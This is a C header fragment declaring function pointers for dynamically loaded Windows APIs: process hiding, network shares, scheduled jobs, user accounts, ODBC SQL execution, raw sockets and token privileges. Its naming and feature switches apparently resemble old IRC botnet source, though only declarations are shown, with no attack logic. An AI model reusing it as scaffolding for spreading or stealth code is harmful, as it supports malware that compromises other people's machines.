
/*#ifndef NO_PING

extern ISE fIcmpSendEcho;
extern ICH fIcmpCloseHandle;
#endif*/

// kernel32.dll function variables
extern RSP fRegisterServiceProcess;
extern CT32S fCreateToolhelp32Snapshot;
extern P32F fProcess32First;
extern P32N fProcess32Next;
extern SP fSearchPath;

// wininet.dll function variables
extern IGCSE fInternetGetConnectedStateEx;
extern IGCS fInternetGetConnectedState;

// odbc32.dll function variables
extern SQLDC fSQLDriverConnect;
extern SQLSEA fSQLSetEnvAttr;
extern SQLED fSQLExecDirect;
extern SQLAH fSQLAllocHandle;
extern SQLFH fSQLFreeHandle;
extern SQLD fSQLDisconnect;

// mpr.dll function variables
extern WNAC2 fWNetAddConnection2;
extern WNAC2W fWNetAddConnection2W;
extern WNCC2 fWNetCancelConnection2;
extern WNCC2W fWNetCancelConnection2W;

// ws2_32.dll function variables
extern WSAS fWSAStartup;
extern WSASo fWSASocket;
extern WSAAS fWSAAsyncSelect;
extern WSAFDIS __fWSAFDIsSet;
extern WSAI fWSAIoctl;
extern WSAGLE fWSAGetLastError;
extern WSAC fWSACleanup;
extern SOCK fsocket;
extern IOCTLS fioctlsocket;
extern CON fconnect;
extern INTOA finet_ntoa;
extern IADDR finet_addr;
extern HTONS fhtons;
extern HTONL fhtonl;
extern NTOHS fntohs;
extern NTOHL fntohl;
extern SEND fsend;
extern SENDTO fsendto;
extern RECV frecv;
extern RECVFROM frecvfrom;
extern BIND fbind;
extern SEL fselect;
extern LIS flisten;
extern ACC faccept;
extern SSO fsetsockopt;
extern GSN fgetsockname;
extern GHN fgethostname;
extern GHBN fgethostbyname;
extern GHBA fgethostbyaddr;
extern GPN fgetpeername;
extern CLSO fclosesocket;

// netapi32.dll function variables
extern NSA fNetShareAdd;
extern NSD fNetShareDel;
extern NSE fNetShareEnum;
extern NSJA fNetScheduleJobAdd;
extern NABF fNetApiBufferFree;
extern NRTOD fNetRemoteTOD;
extern NUA fNetUserAdd;
extern NUD fNetUserDel;
extern NUE fNetUserEnum;
extern NUGI fNetUserGetInfo;
extern NMBS fNetMessageBufferSend; 

#ifndef NO_PROCESS
extern OPT fOpenProcessToken;
extern LPV fLookupPrivilegeValue;
extern ATP fAdjustTokenPrivileges;
#endif